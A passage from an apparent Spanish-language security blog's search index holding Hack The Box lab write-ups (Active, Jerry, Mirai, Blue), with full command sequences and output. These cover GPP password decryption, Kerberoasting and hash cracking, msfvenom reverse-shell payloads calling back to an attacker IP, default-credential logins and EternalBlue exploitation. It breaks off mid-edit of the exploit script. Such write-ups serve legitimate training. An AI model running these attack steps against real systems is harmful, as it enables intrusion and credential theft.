{31B2F340-016D-11D2-945F-00C04FB984F9} │ │ ├── GPT.INI │ │ ├── Group Policy │ │ │ └── GPE.INI │ │ ├── MACHINE │ │ │ ├── Microsoft │ │ │ │ └── Windows NT │ │ │ │ └── SecEdit │ │ │ │ └── GptTmpl.inf │ │ │ ├── Preferences │ │ │ │ └── Groups │ │ │ │ └── Groups.xml │ │ │ └── Registry.pol │ │ └── USER │ └── {6AC1786C-016F-11D2-945F-00C04fB984F9} │ ├── GPT.INI │ ├── MACHINE │ │ └── Microsoft │ │ └── Windows NT │ │ └── SecEdit │ │ └── GptTmpl.inf │ └── USER └── scripts 21 directories, 7 files Descifrando una contraseña en Groups.xml Existe un archivo llamado Groups.xml. Este archivo se utiliza para configurar las políticas del dominio. El archivo es el siguiente:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;  \u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;  \u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34; /\u0026gt;  \u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; Existe un usuario llamado SVC_TGS. La contraseña del usuario está cifrada en una propiedad llamada cpassword. Afortunadamente, la contraseña se puede descifrar porque Microsoft publicó la clave de cifrado para el algoritmo (más información aquí). El proceso de descifrado se realiza con gpp-decrypt:\n$ gpp-decrypt \u0026#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#39; GPPstillStandingStrong2k18 Ahora podemos verificar con crackmapexec si las credenciales son válidas:\n$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 Más enumeración por SMB Ahora que tenemos credenciales válidas, podemos ver si tenemos más permisos en SMB:\n$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 [+] IP: 10.10.10.100:445 Name: 10.10.10.100  Disk Permissions Comment  ---- ----------- -------  ADMIN$ NO ACCESS Remote Admin  C$ NO ACCESS Default share  IPC$ NO ACCESS Remote IPC  NETLOGON READ ONLY Logon server share  Replication READ ONLY  SYSVOL READ ONLY Logon server share  Users READ ONLY Podemos leer archivo del recursos Users, veamos si podemos encontrar la flag user.txt dentro:\n$ smbclient \\\\\\\\10.10.10.100\\\\Users -U SVC_TGS Enter WORKGROUP\\SVC_TGS\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . DR 0 Sat Jul 21 10:39:20 2018  .. DR 0 Sat Jul 21 10:39:20 2018  Administrator D 0 Mon Jul 16 06:14:21 2018  All Users DHSrn 0 Tue Jul 14 01:06:44 2009  Default DHR 0 Tue Jul 14 02:38:21 2009  Default User DHSrn 0 Tue Jul 14 01:06:44 2009  desktop.ini AHS 174 Tue Jul 14 00:57:55 2009  Public DR 0 Tue Jul 14 00:57:55 2009  SVC_TGS D 0 Sat Jul 21 11:16:32 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\\u0026gt; cd SVC_TGS smb: \\SVC_TGS\\\u0026gt; dir  . D 0 Sat Jul 21 11:16:32 2018  .. D 0 Sat Jul 21 11:16:32 2018  Contacts D 0 Sat Jul 21 11:14:11 2018  Desktop D 0 Sat Jul 21 11:14:42 2018  Downloads D 0 Sat Jul 21 11:14:23 2018  Favorites D 0 Sat Jul 21 11:14:44 2018  Links D 0 Sat Jul 21 11:14:57 2018  My Documents D 0 Sat Jul 21 11:15:03 2018  My Music D 0 Sat Jul 21 11:15:32 2018  My Pictures D 0 Sat Jul 21 11:15:43 2018  My Videos D 0 Sat Jul 21 11:15:53 2018  Saved Games D 0 Sat Jul 21 11:16:12 2018  Searches D 0 Sat Jul 21 11:16:24 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\SVC_TGS\\\u0026gt; cd Desktop smb: \\SVC_TGS\\Desktop\\\u0026gt; dir  . D 0 Sat Jul 21 11:14:42 2018  .. D 0 Sat Jul 21 11:14:42 2018  user.txt A 34 Sat Jul 21 11:06:25 2018  10459647 blocks of size 4096. 5725627 blocks available smb: \\SVC_TGS\\Desktop\\\u0026gt; get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) Y aquí la tenemos:\n$ cat user.txt 86d67d8ba232bb6a254aa4d10159e983 Ataque de Kerberoasting Además, con un nombre de usuario válido podemos realizar un ataque AS-REP Roasting. Pero si además tenemos credenciales válidas, podemos realizar un ataque de Kerberoasting.\nEste ataque consiste en requerir el Ticket Granting Service (TGS) de un usuario determinado y romper el hash de manera offline para conseguir la contraseña (si esta es débil).\nPara configurar el ataque, primero tenemos que sincronizarnos con el DC (con rdate o ntpdate):\n# rdate -n 10.10.10.100 Y entonces podemos comprobar si hay algún usuario \u0026ldquo;kerberoasteable\u0026rdquo;:\n$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2021-01-21 11:07:03.723783 El usuario Administrator es \u0026ldquo;kerberoasteable\u0026rdquo;. Ahora podemos solicitar su TGS:\n$ GetUserSPNs.py -dc-ip 10.10.10.100 -request-user Administrator active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2021-01-21 11:07:03.723783 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b3f17bf32ac20951eeebe31bd9eec27c$81267a58ead6dfdf2e1f618d845b12109d42d8da7e9ff346e848944a0a8c76303f16b5ebd58e757552381f48666c4f04e6907dce21cce36981fb17c49fda47e559daba2e3507b33f606e880677d447b21b45661d32d8198d333f97a8e658a5cb346a1a7425028bd1c09c9462b26f4f590a4761b7930201a4d80da3a1c88416e43c1bf5a25fbf332e6d453bbc2df4ad451f801533b1c50e9955352760e968f2b9c5c86b02e2084ef8889d579c70d801427192f07d3a21eb31831bfe512428a86acaa3437b8b2aefb38641cca421d0d5bf1079a292206035a85bbd6262ac949e2ee05c3e9dcdcd795455d3f45205fb1bf165fdb0b2b65adf02c377245959edf1aa933964a6083ba0f6b5d11baa14b7824b2934a3cdf72261f754daace37887e9fef6228cae0cef0c76c9146181669078469eb2785d27249f36c5908127ae2e05af85c83c613e176d6ffca83f2f79eec7a8ca36c1e79461bf40f3a2f925b84467240e6973887cefb29e02edd1158c632ceb7a0d3ce9e202783ceabfcbb91e734141b3f7cfff6e2d9b96f7367a1aa1c07ac138eff4618b650e707a6b00f0973faa5bf617045d14dea21ec41e2e75e772f45e3ece377288cb2f686eb1fa16128effcedf26578c4635d460b12f47798adc01a11056ae5833725b69402a1885f8748151bf865a16ccd229762b553b85fc6e549847d908e96e653f8ad7eeb9e9bbb4de30770feed0173ec8857831b452052c20411c0fde0fc1be1ad2e9577202cd729deb3a8bf226d7b17277ddcd6067f3f243ff50a3c6ec994f2e43a419f489352080d0de7b4f516a7842019f5cd2925ef32b4601baefa5526a843f6565a8f12456d66d766a70968d308cf24c31569dc2eab16a93020dcad74b9fec28f30b67f029267168fed183f33ac452fc1eca15d1e74559f412fc28d013256179b0d1aec2342f2c96f5c07ce74c1da2d7b90513e9041710ca24bac865286c092e1a9ecc70674b34868fa8e57134a8848d1aa1133e8ccd70570493bd8ef41877f5c7b9c7ca2b818ce01e30b492ac29c4b4bcf212249ec5762265f56b10b9ec8412972be10c1aa4c3ed01fffa397cd12f0d4b8ad194a9b2e6bffed8e5ce502f8cdcad4df8b6400e265b1a55573b4ae78fef5cf8e4c9e3fbd838512030f25746092e6f6a9f7f96cc4288b3260dfbd79987766106a52057e0f8326b4ddde971995a265a0f956685a0747ebf2da62af222ebdbbf792d91c363872aabea3621ea2cf7c600 Mediante john y rockyou.txt, podemos tratar de romper el hash:\n$ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Ticketmaster1968 (?) 1g 0:00:00:10 DONE 0.09718g/s 1024Kp/s 1024Kc/s 1024KC/s Tiffani1432..Thrash1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Como vemos, la contraseña es débil y entonces tenemos acceso como Administrator. Para entrar a la máquina, podemos emplear psexec.py y ver la flag root.txt:\n$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file QOyHMYhb.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service eUnT on 10.10.10.100..... [*] Starting service eUnT..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt b5fc76d1d6b91d77b2fbf2d54d0f708b ","image":"/images/HTB/Active/Active.png","permalink":"https://7rocky.github.io/htb/active/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de SMB, descrifrado de contraseñas y Kerberoasting. Para comprometer la máquina se necesitan conocer técnicas básicas de enumeración y explotación de AD","time":6,"title":"Active"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.10.95   Fecha: 30 / 06 / 2018   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.95 -p 8080 Nmap scan report for 10.10.10.95 Host is up (0.035s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-server-header: Apache-Coyote/1.1 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.93 seconds  La máquina tiene abierto el puerto 8080 (HTTP).\nEnumeración Si vamos a http://10.10.10.96:8080, veremos la página por defecto del servidor Tomcat:\nSi tratamos de ir a /manager/html (pinchando en \u0026ldquo;Manager App\u0026rdquo;), nos pide credenciales:\nAl cancelar, aparece un mensaje de error que muestra la configuración por defecto del archivo tomcat-users.xml (y las credenciales por defecto: tomcat:s3cret):\nPodemos probar estas credenciales y ver que estamos dentro:\nAcceso a la máquina En este punto, podemos crear un archivo WAR malicioso para obtener una reverse shell en la máquina. Para ello, podemos utilizar msfvenom como se muestra:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o rev.war Payload size: 1091 bytes Final size of war file: 1091 bytes Saved as: rev.war  Luego subimos el archivo WAR. Y veremos la ruta /rev:\nSi accedemos a ella, obtendremos la conexión en nc:\n$ rlwrap ncat -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.95. Ncat: Connection from 10.10.10.95:49192. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88\u0026gt;  Escalada de privilegios Sorprendentemente, ya somos nt authority\\system, por lo que ya hemos escalado privilegios:\nC:\\apache-tomcat-7.0.88\u0026gt;whoami nt authority\\system  Ahora tenemos que buscar las flags, que vienen juntas:\nC:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; . 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; .. 06/18/2018 11:31 PM \u0026lt;DIR\u0026gt; Administrator 08/22/2013 06:39 PM \u0026lt;DIR\u0026gt; Public 0 File(s) 0 bytes 4 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users\\Administrator\\Desktop Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; flags 0 File(s) 0 bytes 3 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;dir C:\\Users\\Administrator\\Desktop\\flags Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 07:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 2,407,866,368 bytes free C:\\apache-tomcat-7.0.88\u0026gt;type \"C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt\" user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e  ","image":"/images/HTB/Jerry/Jerry.png","permalink":"https://7rocky.github.io/htb/jerry/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina expone una instalación por defecto de Tomcat. Podemos entrar al gestor de aplicaciones con las credentiales por defecto y conseguir ejecución remota de comandos en la máquina como Administrator","time":2,"title":"Jerry"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.10.48   Fecha: 02 / 09 / 2017   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.48 -p 22,53,80,1700,32400,32469 Nmap scan report for 10.10.10.48 Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA) | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA) | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA) |_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: lighttpd/1.4.35 1700/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-favicon: Plex |_http-cors: HEAD GET POST PUT DELETE OPTIONS |_http-title: Unauthorized 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 21.09 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 1700, 32400 y 32469.\nEnumeración del sistema Si nos conectamos al puerto 80 con curl, veremos unas cabeceras de respuesta HTTP extrañas:\n$ curl -i 10.10.10.48 HTTP/1.1 404 Not Found X-Pi-hole: A black hole for Internet advertisements. Content-type: text/html; charset=UTF-8 Content-Length: 0 Date: Fri, 15 Jul 2022 11:47:54 GMT Server: lighttpd/1.4.35  Pi-hole es un servicio para bloquear direcciones IP y dominios que está pensado para funcionar en una Raspberry Pi.\nEl nombre de la máquina (Mirai) hace referencia a un ciberataque que consistió en una botnet que comprometió servidores de DNS con un ataque DDoS. La botnet estaba formada por dispositivos IoT, cámaras IP y otros dispositivos que tenían puertos abiertos con credenciales por defecto.\nIntrusión en la máquina Dado que la máquina es probable que sea una Raspberry Pi, podemos probar a conectarnos por SSH con las credenciales por defecto (usuario: pi, contraseña: raspberry):\n$ ssh pi@10.10.10.48 pi@raspberrypi:~ $ find / -name user.txt 2\u0026gt;/dev/null /home/pi/Desktop/user.txt /lib/live/mount/persistence/sda2/home/pi/Desktop/user.txt pi@raspberrypi:~ $ cat /home/pi/Desktop/user.txt ff837707441b257a20e32199d7c8838d  Y estamos dentro.\nEscalada de privilegios Vamos a realizar una enumeración básica:\npi@raspberrypi:~ $ id uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)  Pertenecemos al grupo sudo, por lo que podemos conseguir una shell como root:\npi@raspberrypi:~ $ sudo su root@raspberrypi:/home/pi# cd root@raspberrypi:~# cat root.txt I lost my original root.txt! I think I may have a backup on my USB stick...  ¿Pero dónde está la flag root.txt? Vamos a mirar en el dispositivo de almacenamiento USB:\nroot@raspberrypi:~# ls -la / total 72 drwxr-xr-x 35 root root 4096 Aug 14 2017 . drwxr-xr-x 35 root root 4096 Aug 14 2017 .. drwxr-xr-x 2 root root 4096 Aug 13 2017 bin drwxr-xr-x 2 root root 4096 Aug 13 2017 boot drwxr-xr-x 17 root root 3280 Jul 15 11:42 dev drwxr-xr-x 170 root root 4096 Dec 24 2017 etc drwxr-xr-x 4 root root 4096 Aug 13 2017 home lrwxrwxrwx 1 root root 33 Dec 13 2016 initrd.img - /boot/initrd.img-3.16.0-4-686-pae lrwxrwxrwx 1 root root 29 Dec 13 2016 initrd.img.old - /boot/initrd.img-3.16.0-4-586 drwxr-xr-x 28 root root 4096 Aug 13 2017 lib drwx------ 2 root root 16384 Aug 13 2017 lost+found drwxr-xr-x 3 root root 4096 Aug 14 2017 media drwxr-xr-x 2 root root 3 Nov 2 2016 mnt drwxr-xr-x 6 root root 4096 Aug 13 2017 opt -rw-r--r-- 1 root root 8 Aug 13 2017 persistence.conf dr-xr-xr-x 127 root root 0 Jul 15 11:41 proc drwx------ 3 root root 4096 Aug 27 2017 root drwxr-xr-x 24 root root 820 Jul 15 11:56 run drwxr-xr-x 2 root root 4096 Dec 24 2017 sbin drwxr-xr-x 2 root root 3 Nov 2 2016 srv dr-xr-xr-x 13 root root 0 Jul 15 11:41 sys drwxrwxrwt 13 root root 320 Jul 15 11:43 tmp drwxr-xr-x 19 root root 4096 Aug 13 2017 usr drwxr-xr-x 17 root root 4096 Aug 13 2017 var lrwxrwxrwx 1 root root 29 Dec 13 2016 vmlinuz - boot/vmlinuz-3.16.0-4-686-pae lrwxrwxrwx 1 root root 25 Dec 13 2016 vmlinuz.old - boot/vmlinuz-3.16.0-4-586 root@raspberrypi:~# ls -la /media total 9 drwxr-xr-x 3 root root 4096 Aug 14 2017 . drwxr-xr-x 35 root root 4096 Aug 14 2017 .. drwxr-xr-x 3 root root 1024 Aug 14 2017 usbstick root@raspberrypi:~# ls -la /media/usbstick/ total 18 drwxr-xr-x 3 root root 1024 Aug 14 2017 . drwxr-xr-x 3 root root 4096 Aug 14 2017 .. -rw-r--r-- 1 root root 129 Aug 14 2017 damnit.txt drwx------ 2 root root 12288 Aug 14 2017 lost+found root@raspberrypi:~# cat /media/usbstick/damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James  Ha sido borrado. Vamos a ver si lo podemos encontrar. Estos son los volúmenes montados en el sistema de archivos:\nroot@raspberrypi:~# df Filesystem 1K-blocks Used Available Use% Mounted on aufs 8856504 2832136 5551436 34% / tmpfs 102396 4868 97528 5% /run /dev/sda1 1354528 1354528 0 100% /lib/live/mount/persistence/sda1 /dev/loop0 1267456 1267456 0 100% /lib/live/mount/rootfs/filesystem.squashfs tmpfs 255988 0 255988 0% /lib/live/mount/overlay /dev/sda2 8856504 2832136 5551436 34% /lib/live/mount/persistence/sda2 devtmpfs 10240 0 10240 0% /dev tmpfs 255988 8 255980 1% /dev/shm tmpfs 5120 4 5116 1% /run/lock tmpfs 255988 0 255988 0% /sys/fs/cgroup tmpfs 255988 8 255980 1% /tmp /dev/sdb 8887 93 8078 2% /media/usbstick tmpfs 51200 0 51200 0% /run/user/999 tmpfs 51200 0 51200 0% /run/user/1000  Ahora podemos hacer una copia completa del dispositivo /dev/sdb (el USB) con dd (metodología forense):\nroot@raspberrypi:~# dd if=/dev/sdb of=/tmp/sdb.dd 20480+0 records in 20480+0 records out 10485760 bytes (10 MB) copied, 0.0873187 s, 120 MB/s  Ahora podemos leer todos los contenidos imprimibles con string (incluso archivos borrados):\nroot@raspberrypi:~# strings /tmp/sdb.dd r \u0026 /media/usbstick lost+found root.txt damnit.txt r \u0026 r \u0026 /media/usbstick lost+found root.txt damnit.txt r \u0026 /media/usbstick 2]8^ lost+found root.txt damnit.txt r \u0026 3d3e483143ff12ec505d026fa13e020b Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James  Y ahí tenemos la flag root.txt.\n","image":"/images/HTB/Mirai/Mirai.png","permalink":"https://7rocky.github.io/htb/mirai/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina es un dispositivo Raspberry Pi que tiene configuradas las credenciales por defecto, por lo que podemos acceder por SSH y convertirnos en root porque pertenecemos al grupo sudo. Para obtener la flag root.txt, tenemos que hacer una copia completa de un dispositivo de almacenamiento USB","time":4,"title":"Mirai"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.10.40   Fecha: 28 / 07 / 2017   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.40 -p 135,139,445,49152,49153,49154,49155,49156,49157 Nmap scan report for 10.10.10.40 Host is up (0.097s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb2-time: | date: |_ start_date: |_clock-skew: mean: -19m57s, deviation: 34m36s, median: 1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 71.62 seconds  La máquina tiene abiertos los puertos 135 (MS-RPC), 139 y 445 (SMB), entre otros.\n$ crackmapexec smb 10.10.10.40 SMB 10.10.10.40 445 HARIS-PC [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  Enumeración Al mirar la versión de SMB (SMBv1), sin firma, descubrimos que podemos efectuar un ataque conocido como EternalBlue (CVE-2017-0144). Además, el nombre de la máquina (Blue) es una pista.\nPodemos listar algunos recursos compartidos por SMB con una sesión nula:\n$ smbclient -L 10.10.10.40 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Share Disk Users Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available  Vamos a lanzar el ataque EternalBlue con MS17-010. Para ello, tenemos que usar Python versión 2.7. La mejor manera es en un contenedor Docker:\n$ docker run -v \"$(pwd):/opt\" -it python:2.7 bash root@2955c01b9358:/# cd /opt root@2955c01b9358:/opt# cd MS17-010/ root@2955c01b9358:/opt/MS17-010# ls -la total 204 drwxr-xr-x 22 root root 704 Jul 15 13:26 . drwxr-xr-x 3 root root 96 Jul 15 13:26 .. drwxr-xr-x 12 root root 384 Jul 15 13:26 .git -rw-r--r-- 1 root root 27786 Jul 15 13:26 BUG.txt -rw-r--r-- 1 root root 3367 Jul 15 13:26 README.md -rw-r--r-- 1 root root 2495 Jul 15 13:26 checker.py -rw-r--r-- 1 root root 25722 Jul 15 13:26 eternalblue_exploit7.py -rw-r--r-- 1 root root 24079 Jul 15 13:26 eternalblue_exploit8.py -rw-r--r-- 1 root root 3804 Jul 15 13:26 eternalblue_poc.py -rw-r--r-- 1 root root 1544 Jul 15 13:26 eternalchampion_leak.py -rw-r--r-- 1 root root 2591 Jul 15 13:26 eternalchampion_poc.py -rw-r--r-- 1 root root 5936 Jul 15 13:26 eternalchampion_poc2.py -rw-r--r-- 1 root root 1651 Jul 15 13:26 eternalromance_leak.py -rw-r--r-- 1 root root 948 Jul 15 13:26 eternalromance_poc.py -rw-r--r-- 1 root root 5107 Jul 15 13:26 eternalromance_poc2.py -rw-r--r-- 1 root root 1865 Jul 15 13:26 eternalsynergy_leak.py -rw-r--r-- 1 root root 3022 Jul 15 13:26 eternalsynergy_poc.py -rw-r--r-- 1 root root 1110 Jul 15 13:26 infoleak_uninit.py -rw-r--r-- 1 root root 16669 Jul 15 13:26 mysmb.py -rw-r--r-- 1 root root 1846 Jul 15 13:26 npp_control.py drwxr-xr-x 5 root root 160 Jul 15 13:26 shellcode -rw-r--r-- 1 root root 43417 Jul 15 13:26 zzz_exploit.py  Tenemos que instalar impacket (pip install impacket). Luego, podemos comprobar que la máquina es vulnerable con checker.py:\nroot@2955c01b9358:/opt/MS17-010# python checker.py checker.py \u0026lt;ip\u0026gt; root@2955c01b9358:/opt/MS17-010# python checker.py 10.10.10.40 Target OS: Windows 7 Professional 7601 Service Pack 1 The target is not patched === Testing named pipes === spoolss: STATUS_ACCESS_DENIED samr: STATUS_ACCESS_DENIED netlogon: STATUS_ACCESS_DENIED lsarpc: STATUS_ACCESS_DENIED browser: STATUS_ACCESS_DENIED  No parece vulnerable. Pero vamos a poner guest como nombre de usuario (necesitamos modificar el script):\nroot@2955c01b9358:/opt/MS17-010# python checker.py 10.10.10.40 Target OS: Windows 7 Professional 7601 Service Pack 1 The target is not patched === Testing named pipes === spoolss: STATUS_OBJECT_NAME_NOT_FOUND samr: Ok (64 bit) netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint)) lsarpc: Ok (64 bit) browser: Ok (64 bit)  Genial, mucho mejor.\nExplotación de SMB En este punto, podemos usar zzz_exploit.py para comprometer la máquina (tenemos que poner guest como usuario otra vez):\nroot@2955c01b9358:/opt/MS17-010# python zzz_exploit.py zzz_exploit.py  Perfecto, ha funcionado. Pero solamente ha creado un archivo C:\\pwned.txt. Para conseguir ejecución remota de comandos (RCE), podemos exponer un binario malicioso mediante un servidor SMB y ejecutarlo:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f exe -o pwn.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: pwn.exe  Ahora tenemos que modificar un poco el exploit. En concreto, esta función tiene que quedar así:\ndefservice_exec(a, v): pass defsmb_pwn(conn, arch): #smbConn = conn.get_smbconnection() #print('creating file c:\\\\pwned.txt on the target') #tid2 = smbConn.connectTree('C$') #fid2 = smbConn.createFile(tid2, '/pwned.txt') #smbConn.closeFile(tid2, fid2) 